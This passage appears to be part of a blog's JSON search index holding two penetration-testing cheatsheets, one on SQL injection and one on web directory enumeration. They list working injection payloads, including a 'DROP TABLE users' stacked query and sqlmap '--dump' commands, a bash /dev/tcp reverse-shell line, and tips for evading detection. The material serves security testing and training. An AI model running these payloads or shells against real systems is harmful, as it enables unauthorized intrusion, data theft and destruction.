CASE WHEN (SUBSTRING(user(),1,1)=\u0026#39;r\u0026#39;) THEN SLEEP(5) ELSE 0 END) \u0026#39;; WAITFOR DELAY \u0026#39;0:0:5\u0026#39;-- Stacked Queries \u0026#39;; DROP TABLE users; -- \u0026#39;; INSERT INTO log_table(user, ts) VALUES (\u0026#39;tester\u0026#39;, NOW()); -- Only available when the database driver supports multiple statements.\nDetection Cheatcodes Check Content-Length differences between responses. For blind cases, use time or response length changes. Monitor HTTP status codes (500 vs 200) during tests. DBMS Fingerprints Indicator Likely DBMS @@version, sysobjects SQL Server information_schema.tables MySQL/PostgreSQL DUAL, FROM dual Oracle sqlite_master SQLite WebSocket Automation Switch to a WebSocket-aware client when the application upgrades connections (e.g. wscat -c ws://host:port/ws). Boolean probes still work; wrap the JSON payload with logical operators such as {\u0026quot;id\u0026quot;:\u0026quot;92130 OR 5=1-- -\u0026quot;}. sqlmap can drive WebSockets directly: sqlmap -u \u0026#39;ws://target/ws\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; --batch sqlmap -u \u0026#39;ws://target/ws\u0026#39; --data \u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39; --level 5 --risk 3 --dump Mitigation Reminders Parameterized queries or stored procedures only. Input validation and allow lists (do not rely on blacklist). Use least privilege DB accounts. Centralize error handling to avoid leaking stack traces. Always capture before/after evidence and coordinate fixes with developers and database administrators.\n","permalink":"https://realspaceeagle.github.io/cheatsheets/sql-injection/","summary":"\u003ch1 id=\"sql-injection-cheatsheet\"\u003eSQL Injection Cheatsheet\u003c/h1\u003e\n\u003ch2 id=\"test-workflow\"\u003eTest Workflow\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eIdentify entry points\u003c/strong\u003e: parameters, headers, cookies, JSON bodies.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBaseline request\u003c/strong\u003e: repeat the request and capture the normal response for comparison.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBreak the query\u003c/strong\u003e: start with a single quote \u003ccode\u003e'\u003c/code\u003e or double quote \u003ccode\u003e\u0026quot;\u003c/code\u003e to look for syntax errors.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eConfirm injection\u003c/strong\u003e: use logic tests such as \u003ccode\u003eAND 1=1\u003c/code\u003e (true) vs \u003ccode\u003eAND 1=2\u003c/code\u003e (false).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eEscalate\u003c/strong\u003e: move from time-based to union-based or stacked queries depending on DBMS.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"quick-payloads\"\u003eQuick Payloads\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-http\" data-lang=\"http\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; -- \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u0026#34; OR \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34; -- \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u0026#39;) OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; -- \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003eadmin\u0026#39; -- \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003eadmin\u0026#39; #\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"numeric-context\"\u003eNumeric Context\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-http\" data-lang=\"http\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e1 OR 1=1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e1 UNION ALL SELECT NULL\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e1 ORDER BY 5--\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"boolean-tests\"\u003eBoolean Tests\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-http\" data-lang=\"http\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e1 AND 1=1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e1 AND SLEEP(5)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e1 AND (SELECT 1 FROM pg_sleep(5))\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"union-enumeration\"\u003eUnion Enumeration\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eCount columns\u003c/strong\u003e: \u003ccode\u003eORDER BY 1\u003c/code\u003e, \u003ccode\u003eORDER BY 2\u003c/code\u003e, increment until error.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMatch types\u003c/strong\u003e: \u003ccode\u003eUNION ALL SELECT NULL,NULL\u003c/code\u003e etc.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExtract data\u003c/strong\u003e: replace \u003ccode\u003eNULL\u003c/code\u003e with payloads like \u003ccode\u003e@@version\u003c/code\u003e, \u003ccode\u003edatabase()\u003c/code\u003e, or \u003ccode\u003ecurrent_user\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-http\" data-lang=\"http\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e1 UNION ALL SELECT @@version, user()\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e1 UNION ALL SELECT NULL, table_name FROM information_schema.tables\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"time-based-enumeration\"\u003eTime-Based Enumeration\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-http\" data-lang=\"http\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e1 AND SLEEP(5)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e1 AND (SELECT CASE WHEN (SUBSTRING(user(),1,1)=\u0026#39;r\u0026#39;) THEN SLEEP(5) ELSE 0 END)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u0026#39;; WAITFOR DELAY \u0026#39;0:0:5\u0026#39;--\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"stacked-queries\"\u003eStacked Queries\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-http\" data-lang=\"http\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u0026#39;; DROP TABLE users; --\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u0026#39;; INSERT INTO log_table(user, ts) VALUES (\u0026#39;tester\u0026#39;, NOW()); --\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cblockquote\u003e\n\u003cp\u003eOnly available when the database driver supports multiple statements.\u003c/p\u003e","title":"SQL Injection Cheatsheet"},{"content":"Web Directory Enumeration Cheatsheet Initial Setup and Preparation Environment Variables Setup # Set up common environment variables for pentesting export LPORT=10.10.14.13 # Your attacking machine IP export RPORT=10.10.11.194 # Target machine IP export LHOST=10.10.14.13 # Alternative naming export RHOST=10.10.11.194 # Alternative naming # Use in commands nc -nlvp $LPORT bash -i \u0026gt;\u0026amp; /dev/tcp/$LPORT/9001 0\u0026gt;\u0026amp;1 Host File Modification # Add target to hosts file for virtual host testing sudo nano /etc/hosts # Example entries 10.10.11.194 soccer.htb 10.10.11.194 soccer.htb soc-player.soccer.htb # Alternative using echo echo \u0026#34;10.10.11.194 soccer.htb\u0026#34; | sudo tee -a /etc/hosts echo \u0026#34;10.10.11.194 soc-player.soccer.htb\u0026#34; | sudo tee -a /etc/hosts # Verify hosts file entries cat /etc/hosts | grep htb Target Information Gathering # Ping test connectivity ping -c 4 $RHOST ping -c 4 soccer.htb # Quick port check nc -zv $RHOST 80 nc -zv $RHOST 443 # DNS resolution check nslookup soccer.htb dig soccer.htb Gobuster Basic Directory Enumeration # Basic directory enumeration gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt # With specific extensions gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php,html,txt # Output to file gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o root.gobuster # Common comprehensive scan gobuster dir -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o root.gobuster Advanced Gobuster Options # Include status codes gobuster dir -u http://target.com -w wordlist.txt -s \u0026#34;200,204,301,302,307,403\u0026#34; # Set custom User-Agent gobuster dir -u http://target.com -w wordlist.txt -a \u0026#34;Mozilla/5.0 (Custom Agent)\u0026#34; # Add cookies gobuster dir -u http://target.com -w wordlist.txt -c \u0026#34;sessionid=abc123\u0026#34; # Add headers gobuster dir -u http://target.com -w wordlist.txt -H \u0026#34;Authorization: Bearer token123\u0026#34; # Proxy through Burp gobuster dir -u http://target.com -w wordlist.txt -p http://127.0.0.1:8080 # Recursive enumeration gobuster dir -u http://target.com -w wordlist.txt -r # Follow redirects gobuster dir -u http://target.com -w wordlist.txt -f Gobuster Modes # Directory mode (default) gobuster dir -u http://target.com -w wordlist.txt # DNS subdomain enumeration gobuster dns -d target.com -w subdomains.txt # Virtual host enumeration gobuster vhost -u http://target.com -w vhosts.txt # S3 bucket enumeration gobuster s3 -w bucket-names.txt Feroxbuster Basic Usage # Basic directory scan feroxbuster -u http://target.com # With wordlist feroxbuster -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt # Medium directory scan feroxbuster -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt Advanced Feroxbuster Features # Multiple extensions feroxbuster -u http://target.com -x php,html,txt,js # Specific depth feroxbuster -u http://target.com --depth 4 # Rate limiting feroxbuster -u http://target.com --rate-limit 10 # Custom threads feroxbuster -u http://target.com -t 50 # Filter status codes feroxbuster -u http://target.com -C 404,403 # Filter response size feroxbuster -u http://target.com -S 1234 # Resume scan feroxbuster --resume-from state.toml Feroxbuster Output Options # JSON output feroxbuster -u http://target.com -o results.json # Silent mode feroxbuster -u http://target.com --silent # Extract links for further enumeration feroxbuster -u http://target.com --extract-links # Random delay between requests feroxbuster -u http://target.com --random-agent Dirsearch Basic Commands # Basic scan dirsearch -u http://target.com # With extensions dirsearch -u http://target.com -e php,html,js # Custom wordlist dirsearch -u http://target.com -w custom-wordlist.txt # Recursive scan dirsearch -u http://target.com -r # Save results dirsearch -u http://target.com --format=simple -o results.txt Ffuf Directory Fuzzing # Basic directory fuzzing ffuf -w wordlist.txt -u http://target.com/FUZZ # With extensions ffuf -w wordlist.txt -u http://target.com/FUZZ -e .php,.html,.txt # Filter by response code ffuf -w wordlist.txt -u http://target.com/FUZZ -mc 200,301,302 # Filter by response size ffuf -w wordlist.txt -u http://target.com/FUZZ -fs 1234 # Output to file ffuf -w wordlist.txt -u http://target.com/FUZZ -o results.json -of json Parameter Fuzzing # GET parameter fuzzing ffuf -w wordlist.txt -u \u0026#34;http://target.com/search?FUZZ=test\u0026#34; # POST data fuzzing ffuf -w wordlist.txt -u http://target.com/login -X POST -d \u0026#34;username=admin\u0026amp;password=FUZZ\u0026#34; # Header fuzzing ffuf -w wordlist.txt -u http://target.com -H \u0026#34;X-Forwarded-For: FUZZ\u0026#34; Wordlists SecLists Common Paths # Small wordlists (fast) /opt/SecLists/Discovery/Web-Content/raft-small-words.txt /opt/SecLists/Discovery/Web-Content/common.txt # Medium wordlists (comprehensive) /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt # Large wordlists (extensive) /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt # Technology-specific /opt/SecLists/Discovery/Web-Content/spring-boot.txt /opt/SecLists/Discovery/Web-Content/apache.txt /opt/SecLists/Discovery/Web-Content/nginx.txt Custom Wordlist Creation # Extract words from target website cewl http://target.com -w custom-wordlist.txt # Combine wordlists cat wordlist1.txt wordlist2.txt | sort -u \u0026gt; combined.txt # Generate variations # Add common extensions to base words sed \u0026#39;s/$/.php/\u0026#39; base-words.txt \u0026gt; php-files.txt sed \u0026#39;s/$/.html/\u0026#39; base-words.txt \u0026gt; html-files.txt Targeted Enumeration Content Management Systems # WordPress gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/wordpress.fuzz.txt # Drupal gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/drupal.fuzz.txt # Joomla gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/joomla.fuzz.txt File Extensions by Technology # PHP applications gobuster dir -u http://target.com -w wordlist.txt -x php,php3,php4,php5,phtml # ASP/ASP.NET applications gobuster dir -u http://target.com -w wordlist.txt -x asp,aspx,asmx,ashx # JSP applications gobuster dir -u http://target.com -w wordlist.txt -x jsp,jspa,jspx # Python applications gobuster dir -u http://target.com -w wordlist.txt -x py,pyc,pyo # Common web files gobuster dir -u http://target.com -w wordlist.txt -x html,htm,js,css,xml,json Backup and Sensitive Files # Common backup extensions gobuster dir -u http://target.com -w wordlist.txt -x bak,backup,old,orig,tmp # Configuration files gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt # Database files gobuster dir -u http://target.com -w wordlist.txt -x sql,db,sqlite,mdb Stealth and Evasion Rate Limiting and Timing # Slow scan to avoid detection gobuster dir -u http://target.com -w wordlist.txt --delay 100ms # Random User-Agent rotation feroxbuster -u http://target.com --random-agent # Custom User-Agent gobuster dir -u http://target.com -w wordlist.txt -a \u0026#34;Mozilla/5.0 (Googlebot)\u0026#34; # Proxy rotation gobuster dir -u http://target.com -w wordlist.txt -p http://proxy1:8080 Request Modification # Add realistic headers gobuster dir -u http://target.com -w wordlist.txt -H \u0026#34;Accept: text/html,application/xhtml+xml\u0026#34; -H \u0026#34;Accept-Language: en-US,en;q=0.9\u0026#34; # Session-based enumeration gobuster dir -u http://target.com -w wordlist.txt -c \u0026#34;PHPSESSID=abc123; auth_token=xyz789\u0026#34; # Method tampering ffuf -w wordlist.txt -u http://target.com/FUZZ -X POST Analysis and Follow-up Response Analysis # Check for interesting status codes grep -E \u0026#34;(200|301|302|403)\u0026#34; gobuster-results.txt # Look for unusual response sizes awk \u0026#39;{print $3, $1}\u0026#39; gobuster-results.txt | sort -n # Extract found directories for further enumeration grep \u0026#34;Status: 200\u0026#34; gobuster-results.txt | awk \u0026#39;{print $1}\u0026#39; \u0026gt; found-dirs.txt Automated Follow-up # Recursive enumeration of found directories while read dir; do gobuster dir -u http://target.com$dir -w wordlist.txt -x php,html done \u0026lt; found-dirs.txt # Screenshot found pages while read url; do cutycapt --url=$url --out=screenshots/$(basename $url).png done \u0026lt; found-urls.txt Common Findings and Next Steps Interesting Directories to Investigate /admin/ - Administrative interfaces /backup/ - Backup files and archives /config/ - Configuration files /uploads/ - File upload functionality /api/ - API endpoints /docs/ - Documentation /test/ - Test files and environments /dev/ - Development resources File Types to Prioritize .php, .asp, .jsp - Server-side scripts .config, .ini, .yaml - Configuration files .sql, .db - Database files .log - Log files with potential sensitive data .bak, .old - Backup files .git/, .svn/ - Version control directories Tips and Best Practices Performance Optimization Start with small wordlists for quick wins Use appropriate thread counts (10-50 for most servers) Implement delays for rate-limited or slow servers Use recursive scanning judiciously to avoid infinite loops Detection Avoidance Rotate User-Agents and request headers Implement random delays between requests Use proxy chains for sensitive targets Monitor for rate limiting or blocking responses Coverage Maximization Use multiple tools with different algorithms Combine wordlists for comprehensive coverage Include technology-specific extensions Follow up manual testing on interesting findings Always ensure you have proper authorization before conducting directory enumeration on any target system.\n","permalink":"https://realspaceeagle.github.io/cheatsheets/web-directory-enumeration/","summary":"\u003ch1 id=\"web-directory-enumeration-cheatsheet\"\u003eWeb Directory Enumeration Cheatsheet\u003c/h1\u003e\n\u003ch2 id=\"initial-setup-and-preparation\"\u003eInitial Setup and Preparation\u003c/h2\u003e\n\u003ch3 id=\"environment-variables-setup\"\u003eEnvironment Variables Setup\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Set up common environment variables for pentesting\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eLPORT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e10.10.14.13    \u003cspan class=\"c1\"\u003e# Your attacking machine IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eRPORT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e10.10.11.194   \u003cspan class=\"c1\"\u003e# Target machine IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eLHOST\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e10.10.14.13    \u003cspan class=\"c1\"\u003e# Alternative naming\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eRHOST\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e10.10.11.194   \u003cspan class=\"c1\"\u003e# Alternative naming\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Use in commands\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -nlvp \u003cspan class=\"nv\"\u003e$LPORT\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebash -i \u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e /dev/tcp/\u003cspan class=\"nv\"\u003e$LPORT\u003c/span\u003e/9001 0\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"host-file-modification\"\u003eHost File Modification\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Add target to hosts file for virtual host testing\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo nano /etc/hosts\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Example entries\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e10.10.11.194   soccer.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e10.10.11.194   soccer.htb soc-player.soccer.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Alternative using echo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;10.10.11.194   soccer.htb\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sudo tee -a /etc/hosts\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;10.10.11.194   soc-player.soccer.htb\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sudo tee -a /etc/hosts\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Verify hosts file entries\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/hosts \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep htb\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"target-information-gathering\"\u003eTarget Information Gathering\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Ping test connectivity\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eping -c \u003cspan class=\"m\"\u003e4\u003c/span\u003e \u003cspan class=\"nv\"\u003e$RHOST\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eping -c \u003cspan class=\"m\"\u003e4\u003c/span\u003e soccer.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Quick port check\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -zv \u003cspan class=\"nv\"\u003e$RHOST\u003c/span\u003e \u003cspan class=\"m\"\u003e80\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -zv \u003cspan class=\"nv\"\u003e$RHOST\u003c/span\u003e \u003cspan class=\"m\"\u003e443\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# DNS resolution check\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enslookup soccer.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edig soccer.htb\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"gobuster\"\u003eGobuster\u003c/h2\u003e\n\u003ch3 id=\"basic-directory-enumeration\"\u003eBasic Directory Enumeration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Basic directory enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# With specific extensions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php,html,txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Output to file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o root.gobuster\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Common comprehensive scan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o root.gobuster\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"advanced-gobuster-options\"\u003eAdvanced Gobuster Options\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Include status codes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -u http://target.com -w wordlist.txt -s \u003cspan class=\"s2\"\u003e\u0026#34;200,204,301,302,307,403\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Set custom 